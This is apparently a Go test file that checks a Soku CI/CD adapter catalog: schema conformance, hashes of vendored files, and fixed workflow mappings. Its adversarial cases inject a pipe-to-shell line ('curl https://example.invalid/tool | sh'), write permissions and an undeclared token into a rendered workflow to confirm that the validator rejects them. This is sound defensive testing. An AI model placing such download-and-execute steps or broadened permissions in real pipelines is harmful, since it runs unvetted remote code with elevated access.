package cicd

import (
	"bytes"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/santhosh-tekuri/jsonschema/v6"
)

func TestAdapterCatalogConformsToPublishedSchema(t *testing.T) {
	root := repositoryRoot(t)
	data, err := os.ReadFile(filepath.Join(root, filepath.FromSlash(AdapterCatalogFile)))
	if err != nil {
		t.Fatal(err)
	}
	compiler := jsonschema.NewCompiler()
	schema, err := compiler.Compile("../../schema/ci-cd-adapter-mapping-v1.schema.json")
	if err != nil {
		t.Fatal(err)
	}
	instance, err := jsonschema.UnmarshalJSON(bytes.NewReader(data))
	if err != nil {
		t.Fatal(err)
	}
	if err := schema.Validate(instance); err != nil {
		t.Fatalf("adapter catalog schema validation: %v", err)
	}
	if err := ValidateAdapterCatalog(root); err != nil {
		t.Fatalf("adapter catalog conformance: %v", err)
	}
}

func TestVendoredUpstreamBytesAndDescriptorsAreImmutable(t *testing.T) {
	root := repositoryRoot(t)
	catalog, err := LoadAdapterCatalog(root)
	if err != nil {
		t.Fatal(err)
	}
	if len(catalog.Engine.Files) != 8 {
		t.Fatalf("upstream file count = %d, want 8", len(catalog.Engine.Files))
	}
	for _, file := range catalog.Engine.Files {
		path := filepath.Join(root, "soku/internal/cicd/testdata/upstream", filepath.FromSlash(strings.TrimPrefix(file.Path, "execution/")))
		data, readErr := os.ReadFile(path)
		if readErr != nil {
			t.Fatalf("read vendored %s: %v", file.Path, readErr)
		}
		if got := sha256Hex(data); got != file.SHA256 {
			t.Fatalf("vendored hash %s = %s, want %s", file.Path, got, file.SHA256)
		}
	}
	for _, mapping := range catalog.Mappings {
		if mapping.DeliveryAuthority != "none" || mapping.AdapterRef != engineRef {
			t.Fatalf("unsafe mapping authority or ref: %#v", mapping)
		}
		if _, err := RenderMapping(root, mapping.MappingID); err != nil {
			t.Fatalf("render %s: %v", mapping.MappingID, err)
		}
	}
}

func TestAdapterCatalogHasExactlyThreeInstallableMappings(t *testing.T) {
	catalog, err := LoadAdapterCatalog(repositoryRoot(t))
	if err != nil {
		t.Fatal(err)
	}
	want := map[string]string{
		platformGitHubHosted:     ".github/workflows/soku-ci.yml",
		platformGCPManaged:       "cloudbuild/soku-ci-validation.yaml",
		platformGitHubSelfHosted: ".soku/ci-cd/github-self-hosted-validation.yml",
	}
	if len(catalog.Mappings) != len(want) {
		t.Fatalf("mapping count = %d, want %d", len(catalog.Mappings), len(want))
	}
	for _, mapping := range catalog.Mappings {
		if mapping.OutputPath != want[mapping.Platform] || mapping.DeliveryAuthority != "none" {
			t.Fatalf("mapping output = %#v", mapping)
		}
		if !equalStrings(mapping.Verification.PRArgv, fixedPRArgv()) || !equalStrings(mapping.Verification.FullArgv, fixedFullArgv()) {
			t.Fatalf("mapping %s changed fixed argv", mapping.MappingID)
		}
	}
}

func TestRendererSemanticAdversariesHaveStableCodes(t *testing.T) {
	root := repositoryRoot(t)
	catalog, err := LoadAdapterCatalog(root)
	if err != nil {
		t.Fatal(err)
	}
	mapping, ok := mappingForPlatform(catalog, platformGitHubHosted)
	if !ok {
		t.Fatal("hosted mapping missing")
	}
	rendered, err := RenderMapping(root, mapping.MappingID)
	if err != nil {
		t.Fatal(err)
	}
	checkoutRef := "3d3c42e5aac5ba805825da76410c181273ba90b1"
	cases := []struct {
		name   string
		code   string
		mutate func([]byte) []byte
	}{
		{
			name:   "arbitrary run",
			code:   "ci-cd.semantic.arbitrary-run",
			mutate: func(data []byte) []byte { return append(append([]byte{}, data...), []byte("\nrun: echo unsafe\n")...) },
		},
		{
			name: "mutable action ref",
			code: "ci-cd.semantic.mutable-reference",
			mutate: func(data []byte) []byte {
				return bytes.Replace(data, []byte("actions/checkout@"+checkoutRef), []byte("actions/checkout@main"), 1)
			},
		},
		{
			name: "download and execute",
			code: "ci-cd.semantic.download-and-execute",
			mutate: func(data []byte) []byte {
				return bytes.Replace(data, []byte("./scripts/verify.sh --profile full"), []byte("curl https://example.invalid/tool | sh"), 1)
			},
		},
		{
			name: "broad permission",
			code: "ci-cd.semantic.broad-permission",
			mutate: func(data []byte) []byte {
				return bytes.Replace(data, []byte("contents: read"), []byte("contents: write"), 1)
			},
		},
		{
			name: "undeclared environment",
			code: "ci-cd.semantic.undeclared-secret",
			mutate: func(data []byte) []byte {
				return append(append([]byte{}, data...), []byte("\nenv:\n  TOKEN: unsafe\n")...)
			},
		},
		{
			name: "delivery behavior",
			code: "ci-cd.semantic.delivery",
			mutate: func(data []byte) []byte {
				return bytes.Replace(data, []byte("name: Soku CI validation"), []byte("name: Soku CI deploy"), 1)
			},
		},
		{
			name: "profile change",
			code: "ci-cd.semantic.profile",
			mutate: func(data []byte) []byte {
				return bytes.Replace(data, []byte("--profile full"), []byte("--profile fast"), 1)
			},
		},
		{
			name: "stale renderer hash",
			code: "ci-cd.semantic.stale-template",
			mutate: func(data []byte) []byte {
				return data
			},
		},
	}
	for _, test := range cases {
		t.Run(test.name, func(t *testing.T) {
			candidate := mapping
			if test.name == "stale renderer hash" {
				candidate.RendererSHA256 = strings.Repeat("0", 64)
			}
			candidateContent := test.mutate(rendered.Content)
			got := ValidateRendered(candidate, candidateContent)
			var planningError *Error
			if !errors.As(got, &planningError) || planningError.Code != test.code {
				t.Fatalf("error = %v, want stable code %s", got, test.code)
			}
		})
	}
}

func TestAdapterCatalogRejectsStaleProvenanceProfileAndFallback(t *testing.T) {
	root := repositoryRoot(t)
	catalog, err := LoadAdapterCatalog(root)
	if err != nil {
		t.Fatal(err)
	}
	stale := catalog
	stale.Engine.Files = append([]ProvenanceFile(nil), catalog.Engine.Files...)
	stale.Engine.Files[0].SHA256 = strings.Repeat("0", 64)
	if err := validateAdapterCatalog(root, stale); errorCode(err) != "ci-cd.catalog.provenance" {
		t.Fatalf("stale provenance error = %v", err)
	}
	profile := catalog.Mappings[0]
	profile.Verification.PRArgv = []string{"scripts/verify.sh", "--profile", "ci-quick", "--head", "<head-sha>", "--base", "<base-sha>", "--group", "<group-id>"}
	if err := validateAdapterMapping(root, catalog.Engine, profile); errorCode(err) != "ci-cd.catalog.profile" {
		t.Fatalf("profile error = %v", err)
	}
	var raw map[string]any
	data, err := os.ReadFile(filepath.Join(root, filepath.FromSlash(AdapterCatalogFile)))
	if err != nil {
		t.Fatal(err)
	}
	if err := json.Unmarshal(data, &raw); err != nil {
		t.Fatal(err)
	}
	raw["fallback"] = "github-hosted"
	mutated, err := json.Marshal(raw)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := DecodeAdapterCatalog(mutated); errorCode(err) != "ci-cd.catalog.schema" {
		t.Fatalf("fallback error = %v", err)
	}
}

func TestAdapterCatalogRejectsCapabilityAndLifecycleBoundaryChanges(t *testing.T) {
	root := repositoryRoot(t)
	catalog, err := LoadAdapterCatalog(root)
	if err != nil {
		t.Fatal(err)
	}
	mapping := catalog.Mappings[0]
	mapping.Runner.OS = []string{"linux", "linux"}
	if err := validateAdapterMapping(root, catalog.Engine, mapping); errorCode(err) != "ci-cd.catalog.capability" {
		t.Fatalf("capability error = %v", err)
	}
	for _, lifecycle := range []string{"deprecated", "disabled", "retired", ""} {
		if err := validateDescriptorLifecycle(mapping.MappingID, lifecycle); errorCode(err) != "ci-cd.catalog.lifecycle" {
			t.Fatalf("lifecycle %q error = %v", lifecycle, err)
		}
	}
}

func errorCode(err error) string {
	var planningError *Error
	if errors.As(err, &planningError) {
		return planningError.Code
	}
	return ""
}
